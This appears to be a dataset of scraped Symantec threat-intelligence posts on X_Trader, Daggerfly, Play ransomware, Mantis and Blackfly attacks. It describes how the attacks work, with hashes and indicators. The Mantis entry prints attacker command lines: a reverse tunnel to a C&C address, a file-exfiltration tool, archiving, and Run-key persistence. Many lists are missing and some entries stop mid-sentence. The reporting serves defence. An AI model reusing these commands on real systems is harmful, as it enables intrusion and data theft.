            "{'tite': 'X_Trader Supply Chain Attack Affects Critical Infrastructure Organizations in U.S. and Europe', 'Explanation': 'the x_trader software supply chain attack affected more organizations than 3cx. initial investigation by symantec’s threat hunter team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the u.s. and the other in europe. in addition to this, two other organizations involved in financial trading were also breached.as reported yesterday by mandiant, trojanized x_trader software was the cause of the 3cx breach, which was uncovered last month. as a result of this breach, 3cx’s software was compromised, with many customers inadvertently downloading malicious versions of the company’s voice and video calling software desktopapp. in addition to wider victims, symantec has also discovered additional indicators of compromise, listed below.it appears likely that the x_trader supply chain attack is financially motivated, since trading technologies, the developer of x_trader, facilitates futures trading, including energy futures. nevertheless, the compromise of critical infrastructure targets is a source of concern. north korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation.the infection chain starts with the trojanized installer named x_trader_r7.17.90p608.exe (sha256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by \"trading technologies international, inc.\" and contains a malicious executable named setup.exe. our analysis of one version of this executable (sha256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named x_trader-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000:if the marker bytes are present, it creates a folder named:it then copies the file c:\\\\windows\\\\sysnative\\\\immersivetpmvscmgrsvr.exe as c:\\\\programdata\\\\tpm\\\\tpmvscmgrsvr.exe to the new folder.next, it will drop two malicious dlls:the content of the dropped files is generated by decrypting chunks of the file x_trader-ja.mst mentioned earlier using the xor algorithm with the following key:to achieve persistence on the victim’s system, the malware invokes a clsid_taskscheduler com object, possibly to create a scheduled task to run periodically the following file:setup.exe then drops a file named x_trader.exe, also contained within the installer. the content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1cb40 using the xor algorithm with the following key:setup will then execute x_trader.exe before deleting itself.once installed, the legitimate x_trader executable side-loads the two malicious dlls dropped by the installer. the first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). the msvcr100.dll file contains an encrypted blob appended to the file. the blob starts with the hex value feedface, which the loader uses to find the blob.the process for payload installation is almost identical as that seen with the trojanized 3cx app, where two side-loaded dlls are used to extract a payload from an encrypted blob.in this attack, the payload extracted is a modular backdoor called veiledsignal (sha256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). veiledsignal contains another dll (sha256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. this can be injected into the chrome, firefox, or edge web browsers. the module contains a second dll (sha256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (c&c) module. it connects to the following c&c url:the discovery that 3cx was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. the attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out.for the latest protection updates, please visit the symantec protection bulletin.if an ioc is malicious and the file available to us, symantec endpoint products will detect and block that file.900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6 -

            "{'tite': 'Daggerfly: APT Actor Targets Telecoms Company in Africa', 'Explanation': 'a telecommunications organization in africa appears to be among the latest targets for the daggerfly (aka evasive panda, bronze highland) advanced persistent threat (apt) group, with the group’s most recent campaign using previously unseen plugins from the mgbot malware framework.the first indications of malicious activity on this victim’s network were seen in november 2022, but there are indications the activity is likely still ongoing. researchers from the threat hunter team at symantec, by broadcom software, found multiple unique plugins associated with the mgbot modular malware framework on the victim’s network. the attackers were also seen using a plugx loader and abusing the legitimate anydesk remote desktop software. use of the mgbot modular malware framework and plugx loader have been associated in the past with china-linked apts.association between this activity and daggerfly is based in part on details in a 2020 blog about activity that malwarebytes attributed to evasive panda. crossovers in the activity included:the folders and file names used in this recent activity, as well as the use of dll side-loading, also support the attribution. the activity documented by malwarebytes occurred in 2020, and daggerfly is believed to have been active since at least 2014.\\xa0suspicious anydesk connections spotted on a microsoft exchange mail server in november 2022 were among the first signs of suspicious activity on the victim network targeted in this recent daggerfly activity. anydesk is a legitimate remote desktop software but it is commonly abused by threat actors for remote access and other purposes.the wannamine crypto-mining malware was also seen on the same exchange server, though it appears likely that this activity was not linked to the daggerfly group. the presence of wannamine, however, does indicate that the server it was found on may have been unpatched and vulnerable to the eternalblue exploit, as well as more recent exploits targeting this web server.the legitimate, free rising antivirus software was also used to side-load the plugx loader onto victim machines.we will go through the attack chain in further detail below.file downloadsthreat actors used the living-off-the-land tools bitsadmin and powershell to download files onto victim systems. the attackers downloaded the legitimate anydesk executable and the getcredmancreds tool in this way.credential dumpingthe attackers used the previously downloaded getcredmancreds script to retrieve the usernames and passwords of web services stored in the credential manager using powershell.they also dumped the sam (security account manager), system, and security hives of the windows registry using the reg.exe tool. this allowed the adversaries to extract credentials from the sam database.persistence with local accountdaggerfly also created a local account to maintain access to victim systems with the following command line:mgbot modular malware frameworkmgbot is a well-designed modular framework that is actively maintained. the components of the framework are the following:the mgbot plugins that were deployed in this activity have numerous capabilities that can provide the attackers with a significant amount of information about compromised machines. among the unique plugins that were deployed during this activity were:all of these capabilities would have allowed the attackers to collect a significant amount of information from victim machines. the capabilities of these plugins also show that the main goal of the attackers during this campaign was information-gathering.daggerfly’s development of these previously unseen plugins demonstrates that the attack group is continuing to actively develop its malware and the tools it can use to target victim networks.\\xa0\\xa0\\xa0telecoms companies will always be a key target in intelligence gathering campaigns due to the access they can potentially provide to the communications of end-users.symantec’s threat hunter team also spotted some other recent activity targeting telecoms companies that was linked with moderate confidence to the threat actor othorene (aka gallium), in what appeared to be a continuation of an intelligence-gathering campaign first reported on by sentinelone under the name operation tainted love in march. sentinelone reported that in that campaign othorene was targeting telecoms companies in the middle east.othorene has been active since around 2014, and it is believed to be a relatively small group that has a strong focus on the surveillance of individuals. there are some indications that othorene may have links with the apt41 (aka blackfly, grayfly) apt group also. overlap of both personnel and tactics, techniques, and procedures (ttps) among chinese apt groups is not uncommon, and can mean that attributing activity to one group with high confidence is difficult.in the activity symantec saw, we found three additional victims of the same campaign that sentinelone detailed, located in asia and africa. two of the three were subsidiaries of the same middle eastern telecoms firm. the attackers had been active on victim networks since november 2022. symantec saw attackers dumping credentials and scanning the network using nbtscan.the main malware (pc.exe dubbed mim221) in this campaign was used to dump credentials, and it had the same password as the malware used in the activity documented by sentinelone. the attackers also moved laterally across victims’ networks, used scheduled task for persistence, and dumped sam and system hives from the registry. there were indications that the attackers may have exported the active directory database on victim machines, and they were also able to gain access to domain controllers, giving them deep access to victim networks.\\xa0for the latest protection

            "{'tite': 'Play Ransomware Group Using New Custom Data-Gathering Tools', 'Explanation': 'the play ransomware group is using two new, custom-developed tools that allow it to enumerate all users and computers on a compromised network, and copy files from the volume shadow copy service (vss) that are normally locked by the operating system.the first tool found by researchers at symantec, by broadcom software, was grixba (infostealer.grixba), which is a network-scanning tool used to enumerate all users and computers in the domain.the threat actors use the .net infostealer to enumerate software and services via wmi, winrm, remote registry, and remote services. the malware checks for the existence of security and backup software, as well as remote administration tools and other programs, saving the gathered information in csv files that are compressed into a zip file for subsequent manual exfiltration by the threat actors.the play ransomware gang developed grixba using costura, a popular.net development tool for embedding an application\\'s dependencies into a single executable file. this eliminates the requirement for the program and its dependencies to be deployed separately, making it easier to share and deploy the application. costura embeds into applications the dll file costura.commandline.dll, which is used by grixba to parse command lines.an analysis of a grixba sample by symantec revealed the following help message and functionality:help messagescan modethe scan mode enumerates software and services via wmi, winrm, remote registry, and remote services.it then checks for the existence of the following security programs:it also checks for the existence of the following backup software:it then checks for the existence of the following remote administration tools:finally, it checks for the existence of the following programs:the malware then saves all the information in csv files and, using winrar, compresses them to a file named export.zip.list of csv files compressed by grixba:scanall modescanall mode is similar to scan mode, but scans for a broader list of programs.clr modeclr mode deletes the logs from local and remote computers. it also enumerates the following registry keys:system\\\\\\\\currentcontrolset\\\\\\\\services\\\\\\\\eventlogsoftware\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\winevt\\\\\\\\channelsit uses the apis \"evtopenlog\" and \"evtclearlog\" to delete the logs and deletes the wmi activity logs from the event source \"microsoft-windows-wmi-activity\".the play ransomware gang was also recently observed using another .net executable, which was also developed with the costura tool.costura embeds the library alphavss into executables. the alphavss library is a.net framework that provides a high-level interface for interacting with vss. the library makes it easier for .net programs to interface with vss by offering a set of controlled apis. developers can use these apis to generate, manage, and delete shadow copies, as well as access information about existing shadow copies such as size and status.the tool created by the play ransomware operators uses alphavss to copy files from vss snapshots. the tool enumerates the files and folders in a vss snapshot and copies them to a destination directory. the tool allows the attackers to copy files from vss volumes on compromised machines prior to encryption. this allows the threat actors to copy files that would normally be locked by the operating system.play ransomware (also known as playcrypt), which is developed by a group symantec tracks as balloonfly, was launched in june 2022, and since then has been responsible for multiple high-profile attacks. like most ransomware groups now, play carries out double-extortion attacks, where the attackers exfiltrate data from victim networks before encrypting them. while the ransomware gang had an initial focus on organizations in latin america, especially brazil, it soon widened its targeting.play is known for targeting microsoft exchange vulnerabilities (cve-2022-41080, cve-2022-41082), as well as other flaws, to gain remote code execution (rce) and infiltrate victim networks. the group was also one of the first ransomware groups to employ intermittent encryption, a technique that allows for faster encryption of victims’ systems. the tactic consists of encrypting only parts of the targeted files\\' content, which would still render the data unrecoverable.play is also notable as it doesn’t appear to operate as a ransomware-as-a-service, with balloonfly seemingly carrying out the ransomware attacks as well as developing the malware.custom tools are increasingly being used by ransomware gangs in their attacks. this is likely due to a number of reasons, such as making attacks more efficient and reducing dwell time. custom tools can be tailored to a specific target environment, allowing ransomware gangs to carry out attacks faster and more efficiently. the use of proprietary tools also gives ransomware operators more control over their operations. if a tool is widely available, it can be reverse-engineered or adapted by other attackers, potentially weakening the initial attack\\'s effectiveness. by keeping their tools proprietary and exclusive, ransomware gangs can maintain their competitive advantage and maximize their profits.for the latest protection

            "{'tite': 'Mantis: New Tooling Used in Attacks Against Palestinian Targets', 'Explanation': 'the mantis cyber-espionage group (aka arid viper, desert falcon, apt-c-23), a threat actor believed to be operating out of the palestinian territories, is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.while the group is known for targeting organizations in the middle east, the most recent campaign uncovered by symantec, by broadcom software, focused on organizations within the palestinian territories, with malicious activity beginning in september 2022 and continuing to at least february 2023. this targeting is not unprecedented for mantis and symantec previously uncovered attacks against individuals located in the palestinian territories during 2017.mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. the group is known to target organizations in israel and a number of other middle eastern countries. sectors targeted include government, military, financial, media, education, energy, and think tanks. the group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices.mantis is widely accepted to be linked to the palestinian territories. while other vendors have linked the group to hamas, symantec cannot make a definitive attribution to any palestinian organization.in its most recent attacks, the group used updated versions of its custom micropsia and arid gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.the initial infection vector for this campaign remains unknown. in one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. compartmentalizing the attack in this fashion was likely a precautionary measure. if one toolset was discovered, the attackers would still have a persistent presence on the target’s network.the following is a description of how one of those three toolsets was used:the first evidence of malicious activity occurred on december 18, 2022. three distinct sets of obfuscated powershell commands were executed to load a base64-encoded string, which started embedded shellcode.\\xa0the shellcode was a 32-bit stager that downloaded another stage using basic tcp-based protocol from a command-and-control (c&c) server: 104.194.222[.]50 port 4444.the attackers returned on december 19 to dump credentials before downloading the micropsia backdoor and putty, a publicly available ssh client, using certutil and bitsadminmicropsia subsequently executed and initiated contact with a c&c server. on the same day, micropsia also executed on three other machines in the same organization. in each case, it ran in a folder named after its file name:on one computer, micropsia was used to set up a reverse socks tunnel to an external ip address:csidl_common_appdata\\\\windowsservicemanageav\\\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [redacted]on december 20, micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.the following day, december 21, rar was executed to archive files on another infected computer.between december 22 and january 2, 2023, micropsia was used to execute the arid gopher backdoor on three infected computers. arid gopher was in turn used to run a tool called setregrunkey.exe that provided persistence by adding arid gopher to the registry so that it executed on reboot. it also ran an unknown file named localsecuritypolicy.exe (this file name was used for the arid gopher backdoor elsewhere by the attackers).on december 28, micropsia was used to run windowspackages.exe on three more infected computers.on december 31, arid gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers.on january 2, the attackers retired the version of arid gopher they were using and introduced a new variant. whether this was because the first version was discovered or whether it was standard operating procedure is unclear.on january 4, micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\\\hostupbroker\\\\hostupbroker.exe. this was immediately followed by the exfiltration of a rar file:csidl_common_appdata\\\\windowsupserv\\\\windowsupserv.exe -f csidl_common_appdata\\\\windowspackages\\\\01-04-2023-15-13-39_getf.raron january 9, arid gopher was used to execute two unknown files on a single computer:the last malicious activity occurred from january 12 onwards when arid gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.variants of the micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. in this campaign, micropsia was deployed using multiple file names and file paths:micropsia is executed using wmi and its main purpose appears to be running secondary payloads for the attackers. these included:in addition to this, micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using winrar in preparation for data exfiltration:\"%programdata%\\\\software distributions\\\\winrar\\\\rar.exe\" a -r -ep1 -v2500k

micropsia, which is written in delphi, arid gopher is written in go. versions of arid gopher used in this campaign contain the following embedded components:arid gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with pyarmor.when communicating with a c&c server, arid gopher registers a device on one path then connects to another path, likely to receive commands:arid gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. one variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually.the embedded setup.env file used by one analyzed variant of arid gopher to retrieve configuration data contained the following:dir=windowsperceptionserviceendpoint=http://jumpstartmail[.]com/iurtier3bnv4erlogs=logs.txtdid=code.txtver=6.1en=2st_method=rst_machine=falsest_flags=xcompressor=7za.exeddir=resourcesfilesbw_too_id=7463b9da-7606-11ed-a1eb-0242ac120002server_token=pdqmkz91l2xdmdelorkbstapp=attestationwmiprovider.exeshort_app=servicehubidentityhost.exethe setup.env configuration file mentions another file, attestationwmiprovider.exe, which is also embedded in arid gopher. the file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. when it executes, it checks for the following command-line arguments:\"key\" with string parameter [run_value_name]\"value\" with string parameter [run_pathname]it then arranges to receive notification on a signal using func os/signal.notify(). once notified, it sets the following registry value:hkey_current_user\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\\"[run_value_name]\" = \"[run_pathname]\"our investigation so far shows this file setting arid gopher to run on reboot:csidl_common_appdata\\\\attestationwmiprovider\\\\attestationwmiprovider.exe -key=networkvirtualizationstartservice \"-value=csidl_common_appdata\\\\networkvirtualizationstartservice\\\\networkvirtualizationstartservice.exe -x\"the attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit pyinstaller executable named windowsupserv.exe. when run, the tool checks for the following command-line arguments:\\xa0\"-d\" \"[file_directory]\"\"-f\" \"[filename]\"for each \"-f\" \"[filename]\" command-line argument, the tool uploads the content of\\xa0[filename]. for each \"-d\" \"[file_directory]\" command-line argument, the tool obtains a list of files stored in the folder\\xa0[file_directory]\\xa0and uploads the content of each file.when uploading each file, the tools sends an http post request to a c&c server with the following parameters:\"kjdfnqweb\":\\xa0[the_file_content]\"qyiwekq\":\\xa0[hostname_of_the_affected_computer]whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. the malware may also log some of its actions in the following files:\"c:\\\\programdata\\\\windowsupserv\\\\success.txt\"\"c:\\\\programdata\\\\windowsupserv\\\\err.txt\"mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks

            "{'tite': 'Blackfly: Espionage Group Targets Materials Technology', 'Explanation': 'the blackfly espionage group (aka apt41, winnti group, bronze atlas) has continued to mount attacks against targets in asia and recently targeted two subsidiaries of an asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property.the following tools were used in attacks during late 2022 and early 2023:blackfly is one of the longest known chinese advanced persistent threat (apt) groups, active since at least 2010. early attacks were distinguished by the use of the plugx/fast (backdoor.korplug), winnti/pasteboy (backdoor.winnti), and shadowpad (backdoor.shadowpad) malware families. the group initially made a name for itself through attacks on the computer gaming industry. it subsequently branched out into targeting a more diverse range of targets, including organizations in the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors.blackfly has been closely associated with a second chinese apt group known as grayfly, so much so that some vendors track the two groups as one actor: apt41. a 2020 indictment of seven men on charges relating to hundreds of cyber attacks carried out by both groups appeared to shed light on this link. two chinese nationals were alleged to have worked with both groups. a crossover in personnel may account for the similarities between both groups.despite being the subject of a u.s. indictment, blackfly has continued to mount attacks, seemingly undeterred by the publicity afforded to the group. although it originally made a name for itself by attacking the gaming sector, the group appears focused on targeting intellectual property in a variety of sectors at present.for the latest protection updates, please visit the symantec protection bulletin.if an ioc is malicious and the file available to us, symantec endpoint products will detect and block that file.cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a – backdoor.winnkite1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 – backdoor.winnkita3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac – backdoor.winnkit714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 – backdoor.winnkit192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 – backdoor.winnkitcaba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 – backdoor.winnkit452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 – screenshotting tool1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e – process-hollowing tool4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d – sql tool560ea79a96dc4f459e96df379b00b59828639b02bd7a7a9964b06d04cb43a35a – dcsyncb28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c – mimikatza3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 – forkplayground5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f – proxy configuration toold4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee – proxy configuration toolf138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f – proxy configuration tool88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4 – proxy configuration tool498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1 – proxy configuration tool100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c – credential-dumping tool\\xa0the threat hunter team is a group of security experts within symantec whose mission is to investigate targeted attacks, drive enhanced protection in symantec products, and offer analysis that helps customers respond to attacks.we encourage you to share your thoughts on your favorite social platform.'}\n"
